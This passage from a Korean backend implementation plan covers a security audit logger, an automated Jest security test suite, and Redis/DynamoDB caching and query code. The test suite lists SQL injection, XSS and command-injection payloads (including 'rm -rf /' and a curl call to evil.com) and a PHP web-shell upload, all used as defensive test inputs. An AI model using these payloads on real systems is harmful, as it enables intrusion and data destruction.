    ].filter(Boolean).join(' ').toLowerCase();
  }
  
  private async alertIfCritical(event: SecurityEvent): Promise<void> {
    if (event.severity === 'critical' || this.isCriticalEvent(event.eventType)) {
      // AlertManager를 통해 즉시 알림
      const { alertManager, alertTemplates } = await import('../monitoring/alerting');
      
      await alertManager.sendAlert({
        level: 'critical',
        type: 'security',
        title: `Security Alert: ${event.eventType}`,
        message: `Critical security event detected: ${event.eventType}`,
        metadata: {
          eventId: event.id,
          userId: event.userId,
          ipAddress: event.ipAddress,
          details: event.details
        }
      });
    }
  }
  
  private isCriticalEvent(eventType: SecurityEventType): boolean {
    const criticalEvents = [
      SecurityEventType.PRIVILEGE_ESCALATION,
      SecurityEventType.SQL_INJECTION_ATTEMPT,
      SecurityEventType.BRUTE_FORCE_ATTEMPT,
      SecurityEventType.SENSITIVE_DATA_ACCESS,
      SecurityEventType.DATA_DELETION
    ];
    
    return criticalEvents.includes(eventType);
  }
  
  // 감사 로그 조회 메서드들
  async querySecurityEvents(params: {
    startTime: Date;
    endTime: Date;
    userId?: string;
    eventType?: SecurityEventType;
    severity?: string;
  }): Promise<SecurityEvent[]> {
    // DynamoDB 쿼리 구현
    // 실제 구현은 GSI를 사용하여 효율적인 쿼리 수행
    return [];
  }
  
  async generateComplianceReport(params: {
    startDate: Date;
    endDate: Date;
    reportType: 'SOC2' | 'ISO27001' | 'GDPR' | 'HIPAA';
  }): Promise<Buffer> {
    // 컴플라이언스 보고서 생성 로직
    const events = await this.querySecurityEvents({
      startTime: params.startDate,
      endTime: params.endDate
    });
    
    // PDF 또는 CSV 형식으로 보고서 생성
    return Buffer.from('Compliance Report');
  }
}

// 보안 감사 미들웨어
export function auditMiddleware(auditLogger: SecurityAuditLogger) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const startTime = Date.now();
    
    // 응답 완료 시 감사 로그 기록
    res.on('finish', async () => {
      const duration = Date.now() - startTime;
      
      // 보안 관련 엔드포인트만 로깅
      if (shouldAuditEndpoint(req.path)) {
        await auditLogger.logSecurityEvent({
          eventType: getEventTypeFromEndpoint(req.path, req.method),
          severity: res.statusCode >= 400 ? 'medium' : 'low',
          userId: req.user?.id,
          ipAddress: req.ip,
          userAgent: req.headers['user-agent'],
          resource: req.path,
          action: req.method,
          result: res.statusCode < 400 ? 'success' : 'failure',
          details: {
            statusCode: res.statusCode,
            duration,
            requestId: req.id,
            body: sanitizeForLogging(req.body)
          }
        });
      }
      
      // 보안 위협 감지
      if (isSecurityThreat(req, res)) {
        await auditLogger.logSecurityEvent({
          eventType: detectThreatType(req, res),
          severity: 'high',
          userId: req.user?.id,
          ipAddress: req.ip,
          userAgent: req.headers['user-agent'],
          resource: req.path,
          action: req.method,
          result: 'failure',
          details: {
            threat: analyzeThreat(req, res)
          }
        });
      }
    });
    
    next();
  };
}

// 헬퍼 함수들
function shouldAuditEndpoint(path: string): boolean {
  const auditPaths = [
    '/api/auth',
    '/api/users',
    '/api/admin',
    '/api/billing',
    '/api/security'
  ];
  
  return auditPaths.some(p => path.startsWith(p));
}

function getEventTypeFromEndpoint(path: string, method: string): SecurityEventType {
  // 경로와 메서드 기반으로 이벤트 타입 결정
  if (path.includes('/login') && method === 'POST') {
    return SecurityEventType.LOGIN_ATTEMPT;
  }
  if (path.includes('/logout')) {
    return SecurityEventType.LOGOUT;
  }
  if (path.includes('/api-keys') && method === 'POST') {
    return SecurityEventType.API_KEY_CREATED;
  }
  // 기타 매핑...
  
  return SecurityEventType.SENSITIVE_DATA_ACCESS;
}

function isSecurityThreat(req: Request, res: Response): boolean {
  // 401, 403 반복 시도
  // SQL injection 패턴 감지
  // XSS 시도 감지
  // Rate limit 초과
  return res.statusCode === 403 || res.statusCode === 401;
}

function detectThreatType(req: Request, res: Response): SecurityEventType {
  if (res.statusCode === 429) {
    return SecurityEventType.RATE_LIMIT_EXCEEDED;
  }
  if (res.statusCode === 401) {
    return SecurityEventType.UNAUTHORIZED_ACCESS;
  }
  return SecurityEventType.SUSPICIOUS_ACTIVITY;
}

function analyzeThreat(req: Request, res: Response): any {
  return {
    method: req.method,
    path: req.path,
    statusCode: res.statusCode,
    headers: req.headers,
    query: req.query
  };
}

function sanitizeForLogging(data: any): any {
  // 민감한 정보 제거
  const sanitized = { ...data };
  const sensitiveFields = ['password', 'token', 'apiKey', 'secret'];
  
  sensitiveFields.forEach(field => {
    if (sanitized[field]) {
      sanitized[field] = '[REDACTED]';
    }
  });
  
  return sanitized;
}
```

### SubTask 0.10.5: 보안 테스트 자동화
**목표**: 자동화된 보안 테스트 스위트 구축

**구현 내용**:
```typescript
// backend/tests/security/security-test-suite.ts
import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import supertest from 'supertest';
import { OWASP_ZAP_API } from '@zaproxy/nodejs';
import sqlmap from 'sqlmap-api';

// 보안 테스트 헬퍼
class SecurityTestHelper {
  private app: any;
  private zapClient: any;
  
  constructor(app: any) {
    this.app = app;
    this.zapClient = new OWASP_ZAP_API({
      apiKey: process.env.ZAP_API_KEY,
      proxy: 'http://localhost:8080'
    });
  }
  
  // SQL Injection 테스트
  async testSQLInjection(endpoint: string, params: Record<string, string>): Promise<void> {
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users;--",
      "1' UNION SELECT NULL--",
      "' OR 1=1--",
      "admin'--",
      "' OR 'a'='a",
      "'; EXEC xp_cmdshell('dir');--"
    ];
    
    for (const [key, value] of Object.entries(params)) {
      for (const payload of sqlPayloads) {
        const testParams = { ...params, [key]: payload };
        const response = await supertest(this.app)
          .get(endpoint)
          .query(testParams);
        
        // SQL 에러 메시지 노출 확인
        expect(response.text).not.toMatch(/SQL syntax/i);
        expect(response.text).not.toMatch(/mysql_/i);
        expect(response.text).not.toMatch(/ORA-\d+/i);
        expect(response.text).not.toMatch(/PostgreSQL/i);
        
        // 정상적인 에러 응답 확인
        expect(response.status).toBeGreaterThanOrEqual(400);
        expect(response.status).toBeLessThan(500);
      }
    }
  }
  
  // XSS 테스트
  async testXSS(endpoint: string, params: Record<string, string>): Promise<void> {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<input onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>'
    ];
    
    for (const [key, value] of Object.entries(params)) {
      for (const payload of xssPayloads) {
        const testParams = { ...params, [key]: payload };
        const response = await supertest(this.app)
          .post(endpoint)
          .send(testParams);
        
        // XSS 페이로드가 그대로 반환되지 않는지 확인
        expect(response.text).not.toContain(payload);
        expect(response.text).not.toMatch(/<script/i);
        expect(response.text).not.toMatch(/javascript:/i);
        expect(response.text).not.toMatch(/onerror=/i);
      }
    }
  }
  
  // CSRF 테스트
  async testCSRF(endpoint: string): Promise<void> {
    // CSRF 토큰 없이 요청
    const response = await supertest(this.app)
      .post(endpoint)
      .send({ action: 'delete' });
    
    expect(response.status).toBe(403);
    expect(response.body.error).toMatch(/CSRF/i);
  }
  
  // 인증 우회 테스트
  async testAuthBypass(protectedEndpoints: string[]): Promise<void> {
    for (const endpoint of protectedEndpoints) {
      // 인증 헤더 없이 요청
      const response1 = await supertest(this.app).get(endpoint);
      expect(response1.status).toBe(401);
      
      // 잘못된 토큰으로 요청
      const response2 = await supertest(this.app)
        .get(endpoint)
        .set('Authorization', 'Bearer invalid-token');
      expect(response2.status).toBe(401);
      
      // 만료된 토큰으로 요청
      const expiredToken = this.generateExpiredToken();
      const response3 = await supertest(this.app)
        .get(endpoint)
        .set('Authorization', `Bearer ${expiredToken}`);
      expect(response3.status).toBe(401);
    }
  }
  
  // Rate Limiting 테스트
  async testRateLimiting(endpoint: string, limit: number): Promise<void> {
    const requests = [];
    
    // 제한보다 많은 요청 보내기
    for (let i = 0; i < limit + 5; i++) {
      requests.push(
        supertest(this.app)
          .get(endpoint)
          .set('X-API-Key', 'test-key')
      );
    }
    
    const responses = await Promise.all(requests);
    
    // 제한 초과 응답 확인
    const rateLimitedResponses = responses.filter(r => r.status === 429);
    expect(rateLimitedResponses.length).toBeGreaterThan(0);
    
    // Rate limit 헤더 확인
    const lastResponse = responses[responses.length - 1];
    expect(lastResponse.headers['x-ratelimit-limit']).toBeDefined();
    expect(lastResponse.headers['x-ratelimit-remaining']).toBeDefined();
    expect(lastResponse.headers['x-ratelimit-reset']).toBeDefined();
  }
  
  // 보안 헤더 테스트
  async testSecurityHeaders(endpoint: string): Promise<void> {
    const response = await supertest(this.app).get(endpoint);
    
    // 필수 보안 헤더 확인
    expect(response.headers['x-content-type-options']).toBe('nosniff');
    expect(response.headers['x-frame-options']).toBe('DENY');
    expect(response.headers['x-xss-protection']).toBe('1; mode=block');
    expect(response.headers['strict-transport-security']).toMatch(/max-age=\d+/);
    expect(response.headers['content-security-policy']).toBeDefined();
    
    // 민감한 헤더가 노출되지 않는지 확인
    expect(response.headers['x-powered-by']).toBeUndefined();
    expect(response.headers['server']).not.toMatch(/version/i);
  }
  
  private generateExpiredToken(): string {
    // 만료된 JWT 토큰 생성
    return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.4Adcj3UFYzPUVaVF43FmMab6RlaQD8A9V8wFzzht-KQ';
  }
}

// 보안 테스트 스위트
describe('Security Test Suite', () => {
  let app: any;
  let securityTester: SecurityTestHelper;
  
  beforeAll(async () => {
    // 테스트 앱 초기화
    app = await createTestApp();
    securityTester = new SecurityTestHelper(app);
  });
  
  afterAll(async () => {
    // 정리
    await cleanupTestApp();
  });
  
  describe('Injection Attacks', () => {
    test('should prevent SQL injection attacks', async () => {
      await securityTester.testSQLInjection('/api/projects', {
        search: 'test',
        sort: 'name'
      });
    });
    
    test('should prevent NoSQL injection attacks', async () => {
      const payload = { '$ne': null };
      const response = await supertest(app)
        .post('/api/projects/search')
        .send({ filter: payload });
      
      expect(response.status).toBe(400);
    });
    
    test('should prevent command injection', async () => {
      const payloads = [
        '; ls -la',
        '| whoami',
        '`rm -rf /`',
        '$(curl evil.com)'
      ];
      
      for (const payload of payloads) {
        const response = await supertest(app)
          .post('/api/execute')
          .send({ command: payload });
        
        expect(response.status).toBe(400);
      }
    });
  });
  
  describe('XSS Prevention', () => {
    test('should prevent reflected XSS', async () => {
      await securityTester.testXSS('/api/projects', {
        name: 'Test Project',
        description: 'Test Description'
      });
    });
    
    test('should prevent stored XSS', async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      
      // 저장 시도
      const createResponse = await supertest(app)
        .post('/api/projects')
        .send({
          name: xssPayload,
          description: xssPayload
        });
      
      if (createResponse.status === 201) {
        // 조회하여 XSS 페이로드가 실행되지 않는지 확인
        const getResponse = await supertest(app)
          .get(`/api/projects/${createResponse.body.id}`);
        
        expect(getResponse.text).not.toContain('<script>');
        expect(getResponse.headers['content-type']).toMatch(/json/);
      }
    });
  });
  
  describe('Authentication & Authorization', () => {
    test('should prevent authentication bypass', async () => {
      const protectedEndpoints = [
        '/api/admin/users',
        '/api/billing/invoices',
        '/api/projects/private'
      ];
      
      await securityTester.testAuthBypass(protectedEndpoints);
    });
    
    test('should prevent privilege escalation', async () => {
      const userToken = await getTestUserToken('user');
      
      // 일반 사용자가 관리자 엔드포인트 접근 시도
      const response = await supertest(app)
        .get('/api/admin/settings')
        .set('Authorization', `Bearer ${userToken}`);
      
      expect(response.status).toBe(403);
    });
    
    test('should prevent JWT token manipulation', async () => {
      const validToken = await getTestUserToken('user');
      
      // 토큰 페이로드 변조
      const parts = validToken.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      payload.role = 'admin';
      parts[1] = Buffer.from(JSON.stringify(payload)).toString('base64');
      const manipulatedToken = parts.join('.');
      
      const response = await supertest(app)
        .get('/api/admin/users')
        .set('Authorization', `Bearer ${manipulatedToken}`);
      
      expect(response.status).toBe(401);
    });
  });
  
  describe('API Security', () => {
    test('should enforce rate limiting', async () => {
      await securityTester.testRateLimiting('/api/public/search', 100);
    });
    
    test('should validate API key format', async () => {
      const invalidKeys = [
        'invalid-key',
        'sk_',
        'sk_short',
        'not_starting_with_sk_validlength1234567890'
      ];
      
      for (const key of invalidKeys) {
        const response = await supertest(app)
          .get('/api/projects')
          .set('X-API-Key', key);
        
        expect(response.status).toBe(401);
        expect(response.body.code).toBe('INVALID_API_KEY_FORMAT');
      }
    });
    
    test('should enforce CORS policy', async () => {
      const response = await supertest(app)
        .options('/api/projects')
        .set('Origin', 'https://evil.com');
      
      expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com');
    });
  });
  
  describe('Security Headers', () => {
    test('should set all required security headers', async () => {
      await securityTester.testSecurityHeaders('/api/health');
    });
    
    test('should not expose sensitive information in errors', async () => {
      const response = await supertest(app)
        .get('/api/this-endpoint-does-not-exist');
      
      expect(response.status).toBe(404);
      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('sql');
      expect(response.body).not.toHaveProperty('database');
    });
  });
  
  describe('Data Protection', () => {
    test('should mask sensitive data in responses', async () => {
      const response = await supertest(app)
        .get('/api/users/profile')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      if (response.status === 200) {
        // 이메일이 마스킹되어 있는지 확인
        expect(response.body.email).toMatch(/^.+\*+.+@.+$/);
        
        // 전화번호가 마스킹되어 있는지 확인
        if (response.body.phone) {
          expect(response.body.phone).toMatch(/\*+\d{4}$/);
        }
      }
    });
    
    test('should encrypt sensitive fields in database', async () => {
      // 이 테스트는 실제 DB 레코드를 확인해야 함
      // 구현은 테스트 환경에 따라 다름
    });
  });
  
  describe('File Upload Security', () => {
    test('should validate file types', async () => {
      const maliciousFile = Buffer.from('<?php system($_GET["cmd"]); ?>');
      
      const response = await supertest(app)
        .post('/api/upload')
        .attach('file', maliciousFile, 'shell.php')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/Invalid file type/i);
    });
    
    test('should enforce file size limits', async () => {
      const largeFile = Buffer.alloc(11 * 1024 * 1024); // 11MB
      
      const response = await supertest(app)
        .post('/api/upload')
        .attach('file', largeFile, 'large.jpg')
        .set('Authorization', `Bearer ${await getTestUserToken('user')}`);
      
      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/File too large/i);
    });
  });
});

// 자동화된 보안 스캔 실행 스크립트
export async function runSecurityScan(targetUrl: string): Promise<void> {
  console.log('🔒 Starting automated security scan...');
  
  // OWASP ZAP 스캔
  const zap = new OWASP_ZAP_API({
    apiKey: process.env.ZAP_API_KEY,
    proxy: 'http://localhost:8080'
  });
  
  // 스파이더 실행
  await zap.spider.scan(targetUrl);
  await waitForSpiderComplete(zap);
  
  // 액티브 스캔 실행
  await zap.ascan.scan(targetUrl);
  await waitForScanComplete(zap);
  
  // 결과 가져오기
  const alerts = await zap.core.alerts(targetUrl);
  
  // 보고서 생성
  const report = generateSecurityReport(alerts);
  await saveSecurityReport(report);
  
  console.log('✅ Security scan completed!');
}

// 헬퍼 함수들
async function getTestUserToken(role: string): Promise<string> {
  // 테스트용 JWT 토큰 생성
  return 'test-token';
}

async function createTestApp(): Promise<any> {
  // 테스트 앱 생성
  return {};
}

async function cleanupTestApp(): Promise<void> {
  // 테스트 정리
}

function generateSecurityReport(alerts: any[]): any {
  // 보안 보고서 생성
  return {
    summary: {
      high: alerts.filter(a => a.risk === 'High').length,
      medium: alerts.filter(a => a.risk === 'Medium').length,
      low: alerts.filter(a => a.risk === 'Low').length
    },
    alerts
  };
}

async function saveSecurityReport(report: any): Promise<void> {
  // 보고서 저장
}

async function waitForSpiderComplete(zap: any): Promise<void> {
  // 스파이더 완료 대기
}

async function waitForScanComplete(zap: any): Promise<void> {
  // 스캔 완료 대기
}
```

**🔧 사용자 작업**:
- 보안 관련 환경 변수 설정 (KMS 키 ID 등)
- API 키 생성 및 관리 정책 수립
- 보안 감사 로그 보관 정책 설정
- 정기적인 보안 테스트 실행 스케줄 설정

---

## Task 0.11: 성능 최적화 기초 설정

### SubTask 0.11.1: 캐싱 전략 구현
**목표**: 다계층 캐싱 시스템 구축

**구현 내용**:
```typescript
// backend/src/performance/caching.ts
import Redis from 'ioredis';
import { LRUCache } from 'lru-cache';
import crypto from 'crypto';
import { logger } from '../config/logger';

// 캐시 키 네임스페이스
enum CacheNamespace {
  PROJECT = 'project',
  USER = 'user',
  COMPONENT = 'component',
  AGENT_RESULT = 'agent_result',
  API_RESPONSE = 'api_response',
  SESSION = 'session'
}

// 캐시 TTL 설정 (초)
const CacheTTL = {
  [CacheNamespace.PROJECT]: 3600,        // 1시간
  [CacheNamespace.USER]: 1800,           // 30분
  [CacheNamespace.COMPONENT]: 86400,     // 24시간
  [CacheNamespace.AGENT_RESULT]: 7200,   // 2시간
  [CacheNamespace.API_RESPONSE]: 300,    // 5분
  [CacheNamespace.SESSION]: 3600         // 1시간
};

export class CacheManager {
  private redis: Redis;
  private memoryCache: LRUCache<string, any>;
  private stats = {
    hits: 0,
    misses: 0,
    errors: 0
  };
  
  constructor() {
    // Redis 연결
    this.redis = new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD,
      db: parseInt(process.env.REDIS_DB || '0'),
      retryStrategy: (times) => {
        const delay = Math.min(times * 50, 2000);
        return delay;
      },
      enableOfflineQueue: true
    });
    
    // 인메모리 캐시 (L1 캐시)
    this.memoryCache = new LRUCache({
      max: 1000,
      ttl: 60000, // 1분
      updateAgeOnGet: true,
      updateAgeOnHas: true
    });
    
    // Redis 이벤트 핸들러
    this.redis.on('error', (err) => {
      logger.error('Redis connection error:', err);
    });
    
    this.redis.on('connect', () => {
      logger.info('Redis connected successfully');
    });
  }
  
  // 캐시 키 생성
  private generateKey(namespace: CacheNamespace, identifier: string, params?: any): string {
    if (!params) {
      return `${namespace}:${identifier}`;
    }
    
    // 파라미터 해시화
    const paramHash = crypto
      .createHash('md5')
      .update(JSON.stringify(params))
      .digest('hex');
    
    return `${namespace}:${identifier}:${paramHash}`;
  }
  
  // 캐시 가져오기 (L1 -> L2)
  async get<T>(
    namespace: CacheNamespace,
    identifier: string,
    params?: any
  ): Promise<T | null> {
    const key = this.generateKey(namespace, identifier, params);
    
    try {
      // L1 캐시 확인
      const memoryValue = this.memoryCache.get(key);
      if (memoryValue !== undefined) {
        this.stats.hits++;
        logger.debug(`Cache hit (L1): ${key}`);
        return memoryValue;
      }
      
      // L2 캐시 (Redis) 확인
      const redisValue = await this.redis.get(key);
      if (redisValue) {
        this.stats.hits++;
        logger.debug(`Cache hit (L2): ${key}`);
        
        const parsed = JSON.parse(redisValue);
        
        // L1 캐시에 저장
        this.memoryCache.set(key, parsed);
        
        return parsed;
      }
      
      this.stats.misses++;
      logger.debug(`Cache miss: ${key}`);
      return null;
      
    } catch (error) {
      this.stats.errors++;
      logger.error(`Cache get error for ${key}:`, error);
      return null;
    }
  }
  
  // 캐시 저장
  async set<T>(
    namespace: CacheNamespace,
    identifier: string,
    value: T,
    params?: any,
    ttl?: number
  ): Promise<void> {
    const key = this.generateKey(namespace, identifier, params);
    const finalTTL = ttl || CacheTTL[namespace] || 3600;
    
    try {
      const serialized = JSON.stringify(value);
      
      // L2 캐시 (Redis) 저장
      await this.redis.setex(key, finalTTL, serialized);
      
      // L1 캐시 (Memory) 저장
      this.memoryCache.set(key, value);
      
      logger.debug(`Cache set: ${key} (TTL: ${finalTTL}s)`);
      
    } catch (error) {
      this.stats.errors++;
      logger.error(`Cache set error for ${key}:`, error);
    }
  }
  
  // 캐시 무효화
  async invalidate(namespace: CacheNamespace, identifier: string, params?: any): Promise<void> {
    const key = this.generateKey(namespace, identifier, params);
    
    try {
      // L1 캐시 삭제
      this.memoryCache.delete(key);
      
      // L2 캐시 삭제
      await this.redis.del(key);
      
      logger.debug(`Cache invalidated: ${key}`);
      
    } catch (error) {
      logger.error(`Cache invalidation error for ${key}:`, error);
    }
  }
  
  // 패턴 기반 캐시 무효화
  async invalidatePattern(pattern: string): Promise<void> {
    try {
      // L1 캐시에서 패턴 매칭 삭제
      for (const key of this.memoryCache.keys()) {
        if (key.match(pattern)) {
          this.memoryCache.delete(key);
        }
      }
      
      // L2 캐시에서 패턴 매칭 삭제
      const keys = await this.redis.keys(pattern);
      if (keys.length > 0) {
        await this.redis.del(...keys);
        logger.debug(`Cache invalidated ${keys.length} keys matching pattern: ${pattern}`);
      }
      
    } catch (error) {
      logger.error(`Pattern cache invalidation error:`, error);
    }
  }
  
  // 캐시 통계
  getStats() {
    const hitRate = this.stats.hits / (this.stats.hits + this.stats.misses) || 0;
    
    return {
      ...this.stats,
      hitRate: (hitRate * 100).toFixed(2) + '%',
      memoryCacheSize: this.memoryCache.size,
      memoryCacheCapacity: this.memoryCache.max
    };
  }
  
  // 캐시 예열 (Cache Warming)
  async warmCache(namespace: CacheNamespace, items: Array<{ identifier: string; value: any; params?: any }>): Promise<void> {
    logger.info(`Warming cache for namespace: ${namespace}`);
    
    const promises = items.map(item =>
      this.set(namespace, item.identifier, item.value, item.params)
    );
    
    await Promise.all(promises);
    
    logger.info(`Cache warmed with ${items.length} items`);
  }
  
  // 캐시 태그 시스템
  async setWithTags<T>(
    namespace: CacheNamespace,
    identifier: string,
    value: T,
    tags: string[],
    params?: any,
    ttl?: number
  ): Promise<void> {
    await this.set(namespace, identifier, value, params, ttl);
    
    // 태그별로 키 저장
    const key = this.generateKey(namespace, identifier, params);
    for (const tag of tags) {
      await this.redis.sadd(`tag:${tag}`, key);
      await this.redis.expire(`tag:${tag}`, 86400); // 24시간
    }
  }
  
  // 태그 기반 캐시 무효화
  async invalidateByTag(tag: string): Promise<void> {
    const keys = await this.redis.smembers(`tag:${tag}`);
    
    if (keys.length > 0) {
      // 모든 관련 키 삭제
      await Promise.all(keys.map(key => {
        this.memoryCache.delete(key);
        return this.redis.del(key);
      }));
      
      // 태그 삭제
      await this.redis.del(`tag:${tag}`);
      
      logger.debug(`Invalidated ${keys.length} cache entries with tag: ${tag}`);
    }
  }
}

// 캐싱 데코레이터
export function Cacheable(namespace: CacheNamespace, ttl?: number) {
  return function (target: any, propertyName: string, descriptor: PropertyDescriptor) {
    const originalMethod = descriptor.value;
    
    descriptor.value = async function (...args: any[]) {
      const cacheManager = (this as any).cacheManager || new CacheManager();
      
      // 캐시 키 생성을 위한 식별자
      const identifier = `${target.constructor.name}.${propertyName}`;
      const params = args.length > 0 ? args : undefined;
      
      // 캐시 확인
      const cached = await cacheManager.get(namespace, identifier, params);
      if (cached !== null) {
        return cached;
      }
      
      // 원본 메서드 실행
      const result = await originalMethod.apply(this, args);
      
      // 결과 캐싱
      await cacheManager.set(namespace, identifier, result, params, ttl);
      
      return result;
    };
    
    return descriptor;
  };
}

// HTTP 응답 캐싱 미들웨어
export function httpCacheMiddleware(options: {
  namespace?: CacheNamespace;
  ttl?: number;
  keyGenerator?: (req: Request) => string;
}) {
  const cacheManager = new CacheManager();
  const {
    namespace = CacheNamespace.API_RESPONSE,
    ttl = 300,
    keyGenerator = (req) => `${req.method}:${req.path}:${JSON.stringify(req.query)}`
  } = options;
  
  return async (req: Request, res: Response, next: NextFunction) => {
    // POST, PUT, DELETE 요청은 캐싱하지 않음
    if (req.method !== 'GET') {
      return next();
    }
    
    const cacheKey = keyGenerator(req);
    
    // 캐시 확인
    const cached = await cacheManager.get(namespace, cacheKey);
    if (cached) {
      res.setHeader('X-Cache', 'HIT');
      res.setHeader('X-Cache-TTL', ttl.toString());
      return res.json(cached);
    }
    
    // 원본 응답 캐싱
    const originalJson = res.json;
    res.json = function (data: any) {
      res.setHeader('X-Cache', 'MISS');
      
      // 성공 응답만 캐싱
      if (res.statusCode >= 200 && res.statusCode < 300) {
        cacheManager.set(namespace, cacheKey, data, undefined, ttl)
          .catch(err => logger.error('Failed to cache response:', err));
      }
      
      return originalJson.call(this, data);
    };
    
    next();
  };
}

// 캐시 관리 API 엔드포인트
export function setupCacheManagementEndpoints(app: Express, cacheManager: CacheManager): void {
  // 캐시 통계
  app.get('/api/admin/cache/stats', (req, res) => {
    res.json(cacheManager.getStats());
  });
  
  // 캐시 무효화
  app.delete('/api/admin/cache/invalidate', async (req, res) => {
    const { namespace, identifier, pattern } = req.body;
    
    try {
      if (pattern) {
        await cacheManager.invalidatePattern(pattern);
      } else if (namespace && identifier) {
        await cacheManager.invalidate(namespace as CacheNamespace, identifier);
      } else {
        return res.status(400).json({ error: 'Invalid parameters' });
      }
      
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: 'Cache invalidation failed' });
    }
  });
  
  // 캐시 예열
  app.post('/api/admin/cache/warm', async (req, res) => {
    const { namespace, items } = req.body;
    
    try {
      await cacheManager.warmCache(namespace as CacheNamespace, items);
      res.json({ success: true, count: items.length });
    } catch (error) {
      res.status(500).json({ error: 'Cache warming failed' });
    }
  });
}
```
---

### SubTask 0.11.2: 데이터베이스 쿼리 최적화
**목표**: DynamoDB 및 기타 데이터베이스 쿼리 최적화

**구현 내용**:
```typescript
// backend/src/performance/query-optimizer.ts
import { DynamoDBDocumentClient, QueryCommand, BatchGetCommand, BatchWriteCommand, UpdateCommand } from '@aws-sdk/lib-dynamodb';
import { logger } from '../config/logger';
import { MetricsHelper } from '../config/metrics';

// 쿼리 성능 모니터링
interface QueryMetrics {
  operation: string;
  table: string;
  duration: number;
  itemCount: number;
  consumedCapacity?: number;
  retryCount: number;
}

export class QueryOptimizer {
  private docClient: DynamoDBDocumentClient;
  private queryCache: Map<string, { data: any; timestamp: number }> = new Map();
  private readonly CACHE_TTL = 60000; // 1분
  
  constructor(docClient: DynamoDBDocumentClient) {
    this.docClient = docClient;
    
    // 정기적으로 캐시 정리
    setInterval(() => this.cleanupCache(), 300000); // 5분마다
  }
  
  // 배치 읽기 최적화
  async batchGet<T>(
    tableName: string,
    keys: Array<Record<string, any>>,
    projectionExpression?: string
  ): Promise<T[]> {
    const startTime = Date.now();
    const results: T[] = [];
    const uncachedKeys: Array<Record<string, any>> = [];
    
    // 캐시에서 먼저 확인
    for (const key of keys) {
      const cacheKey = this.generateCacheKey(tableName, key);
      const cached = this.getFromCache(cacheKey);
      
      if (cached) {
        results.push(cached);
      } else {
        uncachedKeys.push(key);
      }
    }
    
    // 캐시되지 않은 항목만 조회
    if (uncachedKeys.length > 0) {
      // DynamoDB는 최대 100개까지 배치 조회 가능
      const chunks = this.chunkArray(uncachedKeys, 100);
      
      for (const chunk of chunks) {
        const params: any = {
          RequestItems: {
            [tableName]: {
              Keys: chunk
            }
          }
        };
        
        if (projectionExpression) {
          params.RequestItems[tableName].ProjectionExpression = projectionExpression;
        }
        
        try {
          const response = await this.docClient.send(new BatchGetCommand(params));
          
          if (response.Responses?.[tableName]) {
            const items = response.Responses[tableName] as T[];
            results.push(...items);
            
            // 캐시에 저장
            items.forEach((item: any) => {
              const key = this.extractKey(tableName, item);
              const cacheKey = this.generateCacheKey(tableName, key);
              this.setCache(cacheKey, item);
            });
          }
          
          // 처리되지 않은 키가 있으면 재시도
          if (response.UnprocessedKeys?.[tableName]) {
            await this.handleUnprocessedKeys(
              tableName,
              response.UnprocessedKeys[tableName].Keys!,
              results
            );
          }
          
        } catch (error) {
          logger.error(`Batch get error for table ${tableName}:`, error);
          throw error;
        }
      }
    }
    
    // 메트릭 기록
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'batchGet',
      table: tableName,
      duration,
      itemCount: results.length,
      retryCount: 0
    });
    
    return results;
  }
  
  // 배치 쓰기 최적화
  async batchWrite(
    tableName: string,
    items: Array<{ PutRequest?: { Item: any }; DeleteRequest?: { Key: any } }>
  ): Promise<void> {
    const startTime = Date.now();
    let processedCount = 0;
    let retryCount = 0;
    
    // DynamoDB는 최대 25개까지 배치 쓰기 가능
    const chunks = this.chunkArray(items, 25);
    
    for (const chunk of chunks) {
      const params = {
        RequestItems: {
          [tableName]: chunk
        }
      };
      
      let unprocessedItems = chunk;
      const maxRetries = 3;
      
      while (unprocessedItems.length > 0 && retryCount < maxRetries) {
        try {
          const response = await this.docClient.send(new BatchWriteCommand({
            RequestItems: {
              [tableName]: unprocessedItems
            }
          }));
          
          processedCount += unprocessedItems.length;
          
          if (response.UnprocessedItems?.[tableName]) {
            unprocessedItems = response.UnprocessedItems[tableName];
            retryCount++;
            
            // 지수 백오프
            await this.exponentialBackoff(retryCount);
          } else {
            unprocessedItems = [];
          }
          
          // 캐시 무효화
          chunk.forEach(item => {
            if (item.PutRequest) {
              const key = this.extractKey(tableName, item.PutRequest.Item);
              const cacheKey = this.generateCacheKey(tableName, key);
              this.invalidateCache(cacheKey);
            } else if (item.DeleteRequest) {
              const cacheKey = this.generateCacheKey(tableName, item.DeleteRequest.Key);
              this.invalidateCache(cacheKey);
            }
          });
          
        } catch (error) {
          logger.error(`Batch write error for table ${tableName}:`, error);
          throw error;
        }
      }
      
      if (unprocessedItems.length > 0) {
        logger.warn(`${unprocessedItems.length} items were not processed after ${maxRetries} retries`);
      }
    }
    
    // 메트릭 기록
    const duration = Date.now() - startTime;
    this.recordQueryMetrics({
      operation: 'batchWrite',
      table: tableName,
      duration,
      itemCount: processedCount,
      retryCount
    });
  }
  
  // 페이지네이션 최적화
  async *paginatedQuery<T>(
    tableName: string,
    keyConditionExpression: string,
    expressionAttributeValues: Record<string, any>,
    options: {
      indexName?: string;
      projectionExpression?: string;
      filterExpression?: string;
      limit?: number;
      scanIndexForward?: boolean;
